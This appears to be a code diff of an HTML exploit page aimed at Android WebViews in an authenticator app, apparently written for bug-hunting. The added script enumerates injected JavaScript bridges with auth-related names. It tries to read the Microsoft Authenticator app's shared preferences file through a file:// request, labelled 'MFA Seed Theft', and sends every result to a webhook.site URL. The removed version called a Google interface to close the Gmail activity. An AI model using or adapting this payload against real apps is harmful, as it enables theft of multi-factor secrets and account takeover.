@@ -1,21 +1,68 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Authenticator Exploit Payload</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
 <body>
-    <h1>Exploit Running...</h1>
+    <h2>WebView Enumeration</h2>
+    <div id="output" style="word-wrap: break-word; font-family: monospace; font-size: 12px;"></div>
+
     <script>
-        // Check if the vulnerable Google Interface is injected
-        if (typeof window.UpsellInterface !== 'undefined') {
-            
-            // PAYLOAD 1: Force the Gmail Activity to close immediately
-            window.UpsellInterface.finish();
-            
-            // PAYLOAD 2: (Optional) Try to pop up a Google Play purchase dialog
-            // window.UpsellInterface.showBuyFlowWithPurchaseParams(new Uint8Array([0]), "success", "fail");
-            
-        } else {
-            // Fallback to try and redirect if the interface isn't there
-            window.location.href = "https://example.com/failed";
+        function log(msg) {
+            document.getElementById("output").innerHTML += msg + "<br><br>";
+            // Also send it back to your Burp Collaborator / Webhook for easy reading
+            fetch("https://webhook.site/7ceb0796-94e1-402b-a8d9-d0eafe9dbf45?data=" + encodeURIComponent(msg));
         }
+
+        // 1. HUNT FOR JAVASCRIPT BRIDGES (Tokens)
+        log("<b>--- 1. JavaScript Interfaces ---</b>");
+        let foundInterfaces = [];
+        for (let prop in window) {
+            // Filter out standard browser properties to find custom injected objects
+            if (!window.hasOwnProperty || window.hasOwnProperty(prop)) {
+                if (typeof window[prop] === 'object' && prop !== 'window' && prop !== 'document' && prop !== 'location' && prop !== 'chrome') {
+                    // Common Microsoft JS bridge names
+                    if(prop.toLowerCase().includes('external') || 
+                       prop.toLowerCase().includes('msa') || 
+                       prop.toLowerCase().includes('auth') || 
+                       prop.toLowerCase().includes('broker')) {
+                        foundInterfaces.push(prop);
+                        log("<b>Found potential JS Bridge:</b> window." + prop);
+                        
+                        // Enumerate methods on the bridge
+                        try {
+                            let methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window[prop]));
+                            log("Methods: " + methods.join(", "));
+                        } catch(e) {}
+                    }
+                }
+            }
+        }
+        if (foundInterfaces.length === 0) log("No custom JS interfaces found on window object.");
+
+        // 2. CHECK FOR LOCAL FILE ACCESS (MFA Seed Theft)
+        log("<b>--- 2. Local File Access ---</b>");
+        try {
+            var xhr = new XMLHttpRequest();
+            // Try to read the Android manifest or shared prefs
+            xhr.open("GET", "file:///data/data/com.azure.authenticator/shared_prefs/com.azure.authenticator_preferences.xml", true);
+            xhr.onload = function () {
+                if (xhr.status === 0 || xhr.status === 200) {
+                    log("<b>CRITICAL: LOCAL FILE READ ENABLED!</b><br>" + xhr.responseText.substring(0, 100) + "...");
+                }
+            };
+            xhr.onerror = function() {
+                log("Local file read blocked (CORS/FileAccess disabled).");
+            };
+            xhr.send();
+        } catch (e) {
+            log("Local file read error: " + e.message);
+        }
+
+        // 3. CHECK USER AGENT (To see if app appended custom identity strings)
+        log("<b>--- 3. User Agent ---</b>");
+        log(navigator.userAgent);
     </script>
 </body>
 </html>
